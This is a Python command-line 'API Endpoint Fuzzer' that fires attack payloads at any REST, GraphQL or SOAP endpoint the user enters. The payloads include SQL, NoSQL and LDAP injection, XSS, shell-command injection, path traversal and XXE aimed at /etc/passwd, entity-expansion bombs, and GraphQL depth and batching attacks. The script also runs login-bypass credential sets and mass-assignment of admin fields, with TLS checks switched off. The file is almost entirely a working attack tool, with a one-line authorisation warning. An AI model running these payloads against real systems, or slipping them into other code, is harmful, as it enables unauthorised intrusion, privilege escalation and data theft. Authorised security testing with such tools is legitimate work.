#!/usr/bin/env python3
"""
API Endpoint Fuzzer
Fuzzes REST/GraphQL/SOAP APIs with malformed data, boundary testing, and injection payloads
"""

import requests
import json
import random
import string
from urllib.parse import urljoin, urlparse
import time
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def run():
    print("\033[92m" + "="*70)
    print("           API ENDPOINT FUZZER")
    print("="*70 + "\033[0m\n")
    
    print("\033[93m[!] WARNING: Only fuzz authorized APIs!\033[0m\n")
    
    print("\033[97mChoose API Type:\033[0m")
    print("  [1] REST API Fuzzer")
    print("  [2] GraphQL API Fuzzer")
    print("  [3] SOAP API Fuzzer")
    print("  [4] Parameter Pollution")
    print("  [5] Mass Assignment Attack")
    print("  [6] Rate Limit Testing")
    print("  [7] Authentication Bypass Fuzzing")
    
    choice = input("\n\033[95m[?] Select option: \033[0m").strip()
    
    if choice == '1':
        rest_api_fuzzer()
    elif choice == '2':
        graphql_fuzzer()
    elif choice == '3':
        soap_fuzzer()
    elif choice == '4':
        parameter_pollution()
    elif choice == '5':
        mass_assignment_attack()
    elif choice == '6':
        rate_limit_testing()
    elif choice == '7':
        auth_bypass_fuzzing()
    else:
        print("\033[91m[!] Invalid choice.\033[0m")

def rest_api_fuzzer():
    """Fuzz REST API endpoints"""
    print("\n\033[92m[*] REST API Fuzzer\033[0m\n")
    
    base_url = input("\033[97m[?] API base URL (e.g., https://api.example.com): \033[0m").strip()
    endpoint = input("\033[97m[?] Endpoint to fuzz (e.g., /api/v1/users): \033[0m").strip()
    
    if not base_url or not endpoint:
        print("\033[91m[!] URL and endpoint required.\033[0m")
        return
    
    full_url = urljoin(base_url, endpoint)
    
    print("\n\033[97mChoose HTTP method:\033[0m")
    print("  [1] GET")
    print("  [2] POST")
    print("  [3] PUT")
    print("  [4] DELETE")
    print("  [5] PATCH")
    
    method_choice = input("\033[95m[?] Select: \033[0m").strip()
    
    methods = {'1': 'GET', '2': 'POST', '3': 'PUT', '4': 'DELETE', '5': 'PATCH'}
    method = methods.get(method_choice, 'GET')
    
    # Fuzzing payloads
    FUZZ_PAYLOADS = {
        'SQL Injection': ["' OR '1'='1", "1' UNION SELECT NULL--", "admin'--"],
        'XSS': ['<script>alert(1)</script>', '"><script>alert(1)</script>', "javascript:alert(1)"],
        'Command Injection': ['| whoami', '; ls -la', '`id`', '$(whoami)'],
        'Path Traversal': ['../../../etc/passwd', '..\\..\\..\\windows\\win.ini'],
        'XXE': ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'],
        'LDAP Injection': ['*', '*)(&', '*)(uid=*))(|(uid=*'],
        'NoSQL Injection': ['{"$gt": ""}', '{"$ne": null}', '{"$regex": ".*"}'],
        'Buffer Overflow': ['A' * 10000, 'A' * 100000],
        'Format String': ['%s%s%s%s%s%s', '%x%x%x%x%x%x', '%n%n%n%n'],
        'Integer Overflow': ['-1', '0', '2147483647', '2147483648', '-2147483648'],
        'Null/Empty': ['', None, 'null', 'undefined'],
        'Boolean': [True, False, 'true', 'false', '1', '0'],
        'Special Characters': ['!@#$%^&*()', '<>?:"{}|', '\n\r\t'],
        'Unicode/UTF-8': ['测试', '🔥💯', '\u0000', '\uFFFD'],
        'Long Strings': ['x' * 1000, 'test' * 500],
        'Negative Numbers': [-1, -999999, -2147483648],
        'Arrays': [[], ['test'], [1,2,3], ['a']*1000],
        'Objects': [{}, {'test': 'value'}, {'nested': {'deep': 'value'}}],
    }
    
    print(f"\n\033[97m[*] Fuzzing {full_url} with {method} method...\033[0m\n")
    
    results = []
    
    for category, payloads in FUZZ_PAYLOADS.items():
        print(f"\033[93m[*] Testing {category}...\033[0m")
        
        for payload in payloads:
            try:
                # Prepare payload
                if method in ['POST', 'PUT', 'PATCH']:
                    # Try both JSON and form data
                    data_json = {'test': payload, 'value': payload}
                    
                    response = requests.request(
                        method,
                        full_url,
                        json=data_json,
                        timeout=10,
                        verify=False
                    )
                else:
                    # GET/DELETE with query params
                    response = requests.request(
                        method,
                        full_url,
                        params={'test': payload, 'value': payload},
                        timeout=10,
                        verify=False
                    )
                
                # Analyze response
                if is_interesting_response(response, payload):
                    print(f"\033[92m[+] Interesting: {category} - Status: {response.status_code}\033[0m")
                    results.append({
                        'category': category,
                        'payload': str(payload)[:100],
                        'status': response.status_code,
                        'length': len(response.content),
                        'response': response.text[:200]
                    })
                
            except requests.Timeout:
                print(f"\033[93m[!] Timeout with payload: {str(payload)[:50]}\033[0m")
            except Exception as e:
                pass
    
    # Results
    print("\n" + "="*70)
    
    if results:
        print(f"\n\033[92m[+] Found {len(results)} interesting responses!\033[0m\n")
        
        for result in results:
            print(f"\033[93m{result['category']}\033[0m")
            print(f"  Payload: {result['payload']}")
            print(f"  Status: {result['status']}, Length: {result['length']}")
            print(f"  Response: {result['response'][:100]}...\n")
        
        save_results(results, "api_fuzz_results.txt")
    else:
        print(f"\n\033[93m[!] No interesting responses found.\033[0m")

def graphql_fuzzer():
    """Fuzz GraphQL API"""
    print("\n\033[92m[*] GraphQL API Fuzzer\033[0m\n")
    
    url = input("\033[97m[?] GraphQL endpoint URL: \033[0m").strip()
    if not url:
        print("\033[91m[!] No URL provided.\033[0m")
        return
    
    # GraphQL fuzzing payloads
    GRAPHQL_PAYLOADS = [
        # Introspection query
        '{"query": "{__schema{types{name}}}"}',
        '{"query": "query IntrospectionQuery {__schema {queryType {name} mutationType {name}}}"}',
        
        # Batching attacks
        '[{"query": "{user(id: 1){name}}"}, {"query": "{user(id: 2){name}}"}]',
        
        # Depth attacks
        '{"query": "{user{posts{comments{author{posts{comments{author{name}}}}}}}}"}',
        
        # Alias overloading
        '{"query": "{user1: user(id: 1){name} user2: user(id: 2){name} user3: user(id: 3){name}}"}',
        
        # Field duplication
        '{"query": "{user(id: 1){name name name name name}}"}',
        
        # SQL injection in variables
        '{"query": "query($id: String){user(id: $id){name}}", "variables": {"id": "1\' OR \'1\'=\'1"}}',
        
        # XSS in variables
        '{"query": "query($name: String){createUser(name: $name){id}}", "variables": {"name": "<script>alert(1)</script>"}}',
        
        # Directive overloading
        '{"query": "{user(id: 1) @include(if: true) @skip(if: false) @deprecated{name}}"}',
        
        # Fragment recursion
        '{"query": "fragment userFields on User {name ...userFields}"}',
    ]
    
    print(f"\n\033[97m[*] Testing {len(GRAPHQL_PAYLOADS)} GraphQL payloads...\033[0m\n")
    
    results = []
    
    for i, payload in enumerate(GRAPHQL_PAYLOADS, 1):
        try:
            headers = {'Content-Type': 'application/json'}
            
            # Parse payload to get query type
            query_type = "Unknown"
            if "introspection" in payload.lower():
                query_type = "Introspection"
            elif "batching" in payload.lower() or payload.startswith('['):
                query_type = "Batching"
            elif "depth" in payload.lower():
                query_type = "Depth Attack"
            
            response = requests.post(url, data=payload, headers=headers, timeout=10, verify=False)
            
            print(f"\033[93m[{i}] {query_type} - Status: {response.status_code}\033[0m")
            
            # Check for successful GraphQL responses
            if response.status_code == 200:
                try:
                    resp_json = response.json()
                    
                    # Check if introspection is enabled
                    if '__schema' in str(resp_json):
                        print(f"\033[92m[+] Introspection enabled!\033[0m")
                        results.append({
                            'type': 'Introspection',
                            'payload': payload,
                            'finding': 'GraphQL introspection is enabled'
                        })
                    
                    # Check for errors
                    if 'errors' not in resp_json:
                        results.append({
                            'type': query_type,
                            'payload': payload,
                            'response': str(resp_json)[:200]
                        })
                
                except:
                    pass
        
        except Exception as e:
            print(f"\033[91m[!] Error: {str(e)[:50]}\033[0m")
    
    # Results
    if results:
        print(f"\n\033[92m[+] Found {len(results)} GraphQL issues!\033[0m\n")
        
        for result in results:
            print(f"\033[93mType: {result['type']}\033[0m")
            print(f"  Payload: {result['payload'][:100]}...")
            if 'finding' in result:
                print(f"  Finding: {result['finding']}")
            print()
        
        save_results(results, "graphql_fuzz_results.txt")
    else:
        print(f"\n\033[93m[!] No GraphQL issues found.\033[0m")

def soap_fuzzer():
    """Fuzz SOAP API"""
    print("\n\033[92m[*] SOAP API Fuzzer\033[0m\n")
    
    url = input("\033[97m[?] SOAP endpoint URL: \033[0m").strip()
    action = input("\033[97m[?] SOAP action (optional): \033[0m").strip()
    
    if not url:
        print("\033[91m[!] No URL provided.\033[0m")
        return
    
    # SOAP fuzzing payloads
    SOAP_PAYLOADS = [
        # XXE attack
        '''<?xml version="1.0"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
            <soap:Body><test>&xxe;</test></soap:Body>
        </soap:Envelope>''',
        
        # Billion laughs attack
        '''<?xml version="1.0"?>
        <!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]>
        <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
            <soap:Body><test>&lol2;</test></soap:Body>
        </soap:Envelope>''',
        
        # XPath injection
        '''<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
            <soap:Body><Login><username>' or '1'='1</username></Login></soap:Body>
        </soap:Envelope>''',
        
        # Command injection
        '''<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
            <soap:Body><test>; ls -la;</test></soap:Body>
        </soap:Envelope>''',
    ]
    
    print(f"\n\033[97m[*] Testing {len(SOAP_PAYLOADS)} SOAP payloads...\033[0m\n")
    
    results = []
    
    for payload in SOAP_PAYLOADS:
        try:
            headers = {
                'Content-Type': 'text/xml; charset=utf-8',
                'SOAPAction': action or ''
            }
            
            response = requests.post(url, data=payload, headers=headers, timeout=10, verify=False)
            
            if is_interesting_response(response, payload):
                print(f"\033[92m[+] Interesting response - Status: {response.status_code}\033[0m")
                results.append({
                    'payload': payload[:100],
                    'status': response.status_code,
                    'response': response.text[:200]
                })
        
        except Exception as e:
            print(f"\033[91m[!] Error: {str(e)[:50]}\033[0m")
    
    if results:
        save_results(results, "soap_fuzz_results.txt")

def parameter_pollution():
    """Test HTTP parameter pollution"""
    print("\n\033[92m[*] HTTP Parameter Pollution\033[0m\n")
    
    url = input("\033[97m[?] Target URL: \033[0m").strip()
    if not url:
        print("\033[91m[!] No URL provided.\033[0m")
        return
    
    # HPP payloads
    HPP_TESTS = [
        {'param': 'id', 'value1': '1', 'value2': '2'},  # id=1&id=2
        {'param': 'user', 'value1': 'user', 'value2': 'admin'},  # user=user&user=admin
        {'param': 'role', 'value1': 'guest', 'value2': 'admin'},  # role=guest&role=admin
    ]
    
    print(f"\n\033[97m[*] Testing parameter pollution...\033[0m\n")
    
    for test in HPP_TESTS:
        try:
            # Normal request
            response1 = requests.get(url, params={test['param']: test['value1']}, timeout=10, verify=False)
            
            # Polluted request
            polluted_url = f"{url}?{test['param']}={test['value1']}&{test['param']}={test['value2']}"
            response2 = requests.get(polluted_url, timeout=10, verify=False)
            
            # Compare responses
            if response1.text != response2.text:
                print(f"\033[92m[+] HPP detected: {test['param']}={test['value1']}&{test['param']}={test['value2']}\033[0m")
            else:
                print(f"\033[90m[-] No difference: {test['param']}\033[0m")
        
        except Exception as e:
            print(f"\033[91m[!] Error: {str(e)}\033[0m")

def mass_assignment_attack():
    """Test mass assignment vulnerabilities"""
    print("\n\033[92m[*] Mass Assignment Attack\033[0m\n")
    
    url = input("\033[97m[?] API endpoint URL (e.g., /api/users): \033[0m").strip()
    if not url:
        print("\033[91m[!] No URL provided.\033[0m")
        return
    
    # Common privileged fields to inject
    PRIVILEGED_FIELDS = [
        {'isAdmin': True},
        {'admin': True},
        {'role': 'admin'},
        {'role': 'administrator'},
        {'is_admin': True},
        {'is_superuser': True},
        {'permissions': 'all'},
        {'access_level': 999},
        {'verified': True},
        {'active': True},
        {'enabled': True},
    ]
    
    print(f"\n\033[97m[*] Testing mass assignment...\033[0m\n")
    
    for field_data in PRIVILEGED_FIELDS:
        try:
            # Create payload with privileged field
            payload = {
                'username': 'testuser',
                'email': 'test@test.com',
                **field_data  # Add privileged field
            }
            
            response = requests.post(url, json=payload, timeout=10, verify=False)
            
            field_name = list(field_data.keys())[0]
            
            if response.status_code in [200, 201]:
                # Check if field was accepted
                if field_name in response.text:
                    print(f"\033[92m[+] Field accepted: {field_name}\033[0m")
                else:
                    print(f"\033[90m[-] Field rejected: {field_name}\033[0m")
            else:
                print(f"\033[90m[-] Request failed: {field_name} - Status: {response.status_code}\033[0m")
        
        except Exception as e:
            print(f"\033[91m[!] Error: {str(e)}\033[0m")

def rate_limit_testing():
    """Test API rate limiting"""
    print("\n\033[92m[*] Rate Limit Testing\033[0m\n")
    
    url = input("\033[97m[?] API endpoint URL: \033[0m").strip()
    if not url:
        print("\033[91m[!] No URL provided.\033[0m")
        return
    
    num_requests = int(input("\033[97m[?] Number of requests to send (default 100): \033[0m").strip() or "100")
    
    print(f"\n\033[97m[*] Sending {num_requests} requests...\033[0m\n")
    
    rate_limited = False
    successful = 0
    failed = 0
    
    start_time = time.time()
    
    for i in range(1, num_requests + 1):
        try:
            response = requests.get(url, timeout=10, verify=False)
            
            if response.status_code == 429:  # Too Many Requests
                if not rate_limited:
                    print(f"\n\033[93m[!] Rate limited at request {i}\033[0m")
                    rate_limited = True
                failed += 1
            elif response.status_code == 200:
                successful += 1
                if i % 10 == 0:
                    print(f"\r\033[97m[*] Progress: {i}/{num_requests}\033[0m", end='', flush=True)
            else:
                failed += 1
        
        except Exception as e:
            failed += 1
    
    elapsed = time.time() - start_time
    
    print(f"\n\n\033[92m{'='*70}\033[0m")
    print(f"\033[97m[*] Total Requests: {num_requests}\033[0m")
    print(f"\033[92m[*] Successful: {successful}\033[0m")
    print(f"\033[91m[*] Failed: {failed}\033[0m")
    print(f"\033[97m[*] Time: {elapsed:.2f}s\033[0m")
    print(f"\033[97m[*] Rate: {num_requests/elapsed:.2f} req/s\033[0m")
    
    if not rate_limited:
        print(f"\n\033[91m[!] WARNING: No rate limiting detected!\033[0m")
    else:
        print(f"\n\033[92m[+] Rate limiting is in place.\033[0m")

def auth_bypass_fuzzing():
    """Fuzz authentication bypass techniques"""
    print("\n\033[92m[*] Authentication Bypass Fuzzer\033[0m\n")
    
    url = input("\033[97m[?] Login/Auth endpoint URL: \033[0m").strip()
    if not url:
        print("\033[91m[!] No URL provided.\033[0m")
        return
    
    # Auth bypass payloads
    AUTH_BYPASS_PAYLOADS = [
        # SQL injection
        {"username": "admin' or '1'='1'--", "password": "anything"},
        {"username": "admin'--", "password": ""},
        {"username": "' or 1=1--", "password": "' or 1=1--"},
        
        # NoSQL injection
        {"username": {"$gt": ""}, "password": {"$gt": ""}},
        {"username": {"$ne": None}, "password": {"$ne": None}},
        
        # Empty/null
        {"username": "", "password": ""},
        {"username": None, "password": None},
        
        # Array bypass
        {"username": ["admin"], "password": ["admin"]},
        
        # Boolean bypass
        {"username": "admin", "password": True},
        {"username": True, "password": True},
    ]
    
    print(f"\n\033[97m[*] Testing {len(AUTH_BYPASS_PAYLOADS)} auth bypass payloads...\033[0m\n")
    
    results = []
    
    for i, payload in enumerate(AUTH_BYPASS_PAYLOADS, 1):
        try:
            response = requests.post(url, json=payload, timeout=10, verify=False)
            
            print(f"\033[93m[{i}] Payload: {str(payload)[:60]} - Status: {response.status_code}\033[0m")
            
            # Check for successful authentication
            if is_auth_successful(response):
                print(f"\033[92m[+] Possible bypass!\033[0m")
                results.append({
                    'payload': payload,
                    'status': response.status_code,
                    'response': response.text[:200]
                })
        
        except Exception as e:
            print(f"\033[91m[!] Error: {str(e)[:50]}\033[0m")
    
    if results:
        print(f"\n\033[92m[+] Found {len(results)} potential bypasses!\033[0m\n")
        save_results(results, "auth_bypass_results.txt")
    else:
        print(f"\n\033[93m[!] No auth bypasses found.\033[0m")

def is_interesting_response(response, payload):
    """Check if response is interesting for fuzzing"""
    # Status codes of interest
    interesting_statuses = [200, 201, 401, 403, 500, 502, 503]
    
    if response.status_code in interesting_statuses:
        # Check for errors
        error_keywords = ['error', 'exception', 'stack', 'trace', 'warning', 'failed', 'sql', 'syntax']
        
        if any(keyword in response.text.lower() for keyword in error_keywords):
            return True
        
        # Check for unusual response lengths
        if len(response.content) > 10000 or len(response.content) == 0:
            return True
    
    return False

def is_auth_successful(response):
    """Check if authentication was successful"""
    success_indicators = [
        'token', 'jwt', 'session', 'logged in', 'success',
        'dashboard', 'welcome', 'authenticated'
    ]
    
    if response.status_code in [200, 201, 302]:
        for indicator in success_indicators:
            if indicator in response.text.lower():
                return True
    
    return False

def save_results(results, filename):
    """Save results to file"""
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("API Fuzzing Results\n")
            f.write("="*70 + "\n\n")
            
            for result in results:
                f.write(json.dumps(result, indent=2))
                f.write("\n" + "="*70 + "\n")
        
        print(f"\n\033[92m[*] Results saved to {filename}\033[0m")
    except Exception as e:
        print(f"\033[91m[!] Error saving: {str(e)}\033[0m")

if __name__ == "__main__":
    run()
